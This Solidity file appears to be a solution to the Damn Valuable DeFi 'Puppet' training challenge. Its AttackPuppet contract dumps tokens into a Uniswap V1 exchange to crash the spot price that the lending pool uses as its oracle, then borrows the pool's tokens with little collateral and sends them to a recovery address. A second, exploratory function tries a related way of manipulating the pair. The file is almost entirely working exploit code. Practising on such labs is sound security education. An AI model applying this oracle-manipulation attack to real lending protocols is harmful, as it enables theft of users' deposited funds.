// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

import {PuppetPool} from "../../src/puppet/PuppetPool.sol";

contract AttackPuppet {
    PuppetPool lendingPool;
    DamnValuableToken token;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor(PuppetPool _pool, DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange, address _recovery) {
        lendingPool = _pool;
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack(uint256 exploitAmount) public {
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
        console.log("exploiter Ether balance : ", address(this).balance);
        lendingPool.borrow{value: address(this).balance}(exploitAmount, recovery);
    }

    function attackInitial() public {
        //? Below all was what i thought of inititally
        // our strategy : we will buy some tokens and will send to the uiniswap pair then the will price will be decreased
        address uniswapPair = lendingPool.uniswapPair();
        token.transfer(uniswapPair, token.balanceOf(address(this)));
        // (bool success,) = uniswapPair.call{value: 2 ether}("");
        // require(success, "Ether transfer to uniswap pair failed");
        console.log(" calculateDepositRequired : ", lendingPool.calculateDepositRequired(1e18));
        console.log("exploiter Ether balance : ", address(this).balance);
        console.log("pool token balance : ", token.balanceOf(address(lendingPool)));
        uint256 SCALE = 1e18; // 18 decimal places
        uint256 multiplier = 1;

        for (uint256 i = 0; i < 10; i++) {
            uint256 ethToDepositForOneToken = lendingPool.calculateDepositRequired(1e18);
            console.log("ethToDepositForOneToken : ", ethToDepositForOneToken);
            lendingPool.borrow{value: ethToDepositForOneToken * multiplier}(1e18 * multiplier, address(this));
            console.log("exploiter Ether balance : ", address(this).balance);
            // console.log("token.balanceOf(address(this)) : ", token.balanceOf(address(this)));
            token.transfer(uniswapPair, token.balanceOf(address(this)));
        }

        uint256 multiplier2 = 1;

        while (token.balanceOf(address(lendingPool)) > 0) {
            uint256 ethToDepositForOneToken = lendingPool.calculateDepositRequired(1e18);
            console.log("ethToDepositForOneToken : ", ethToDepositForOneToken);
            lendingPool.borrow{value: ethToDepositForOneToken * multiplier2}(1e18 * multiplier2, address(this));
            console.log("exploiter Ether balance : ", address(this).balance);
            // console.log("token.balanceOf(address(this)) : ", token.balanceOf(address(this)));
            token.transfer(uniswapPair, token.balanceOf(address(this)));
        }
    }

    receive() external payable {}
}
